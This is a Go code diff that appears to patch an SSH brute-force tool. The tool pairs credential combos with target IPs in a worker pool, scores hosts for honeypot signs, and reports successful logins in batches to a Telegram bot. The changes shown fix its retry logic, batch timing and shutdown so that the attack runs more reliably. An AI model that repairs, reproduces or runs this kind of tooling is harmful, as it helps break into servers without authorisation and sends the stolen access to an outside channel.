@@ -10,6 +10,7 @@ import (
 	"log"
 	"mime/multipart"
 	"net/http"
+	"context"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -422,6 +423,17 @@ func detectAnomalies(serverInfo *ServerInfo) int {
 	return score
 }
 
+func getIPInfo(ip string) IPInfo {
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	info, err := getIPInfoMulti(ctx, ip)
+	if err != nil {
+		return IPInfo{IP: ip}
+	}
+	return info
+}
+
 func getIPInfoMulti(ctx context.Context, ip string) (IPInfo, error) {
 	apis := []string{
 		"https://ipinfo.io/%s/json",
@@ -461,14 +473,15 @@ func getIPInfoMulti(ctx context.Context, ip string) (IPInfo, error) {
 }
 
 func createTelegramBot() *tgbotapi.BotAPI {
-	for {
+	for attempts := 0; attempts < 3; attempts++ {
 		bot, err := tgbotapi.NewBotAPI(botToken)
 		if err == nil {
 			return bot
 		}
-		log.Printf("Bot error: %v. Retrying...", err)
+		log.Printf("Bot error (attempt %d/3): %v", attempts+1, err)
 		time.Sleep(5 * time.Second)
 	}
+	return nil
 }
 
 var httpClient = &http.Client{
@@ -538,6 +551,10 @@ func sendSuccessBatch(batch []Success) {
 // === SEND HIGH-SCORE HONEYPOT TO TELEGRAM + API ===
 func sendHighScoreHoneypot(s Success) {
 	bot := createTelegramBot()
+	if bot == nil {
+		log.Println("Failed to create Telegram bot for honeypot alert")
+		return
+	}
 
 	// Escape all dynamic data
 	ip := html.EscapeString(s.Info.IP)
@@ -617,13 +634,12 @@ func successBatchProcessor(ch chan Success) {
 	var batch []Success
 	const size = 2
 	const timeout = 20 * time.Second
-	timer := time.NewTimer(timeout)
-	timer.Stop()
 
 	for {
 		select {
 		case s, ok := <-ch:
 			if !ok {
+				// Channel closed, send remaining batch
 				if len(batch) > 0 {
 					sendSuccessBatch(batch)
 				}
@@ -633,11 +649,8 @@ func successBatchProcessor(ch chan Success) {
 			if len(batch) >= size {
 				sendSuccessBatch(batch[:size])
 				batch = batch[size:]
-				timer.Reset(timeout)
-			} else if len(batch) == 1 {
-				timer.Reset(timeout)
 			}
-		case <-timer.C:
+		case <-time.After(timeout):
 			if len(batch) > 0 {
 				sendSuccessBatch(batch)
 				batch = nil
@@ -646,6 +659,7 @@ func successBatchProcessor(ch chan Success) {
 	}
 }
 
+// Fix the honeypotHighScoreProcessor:
 func honeypotHighScoreProcessor(ch chan Success) {
 	for s := range ch {
 		sendHighScoreHoneypot(s)
@@ -753,16 +767,19 @@ func setupEnhancedWorkerPool(combos, ips [][]string) {
 	taskQ := make(chan SSHTask, buf)
 	var wg sync.WaitGroup
 
+	// Start workers
 	for i := 0; i < maxConnections; i++ {
 		wg.Add(1)
 		go enhancedMainWorker(i, taskQ, &wg)
 	}
 
+	// Start monitoring goroutines
 	go banner()
 	go honeypotSender()
 	go successBatchProcessor(successChan)
 	go honeypotHighScoreProcessor(honeypotChan)
 
+	// Feed tasks
 	go func() {
 		for _, c := range combos {
 			for _, ip := range ips {
@@ -772,7 +789,11 @@ func setupEnhancedWorkerPool(combos, ips [][]string) {
 		close(taskQ)
 	}()
 
+	// Wait for workers to finish
 	wg.Wait()
+
+	// Give processors time to finish their batches
+	time.Sleep(2 * time.Second)
 	close(successChan)
 	close(honeypotChan)
 }
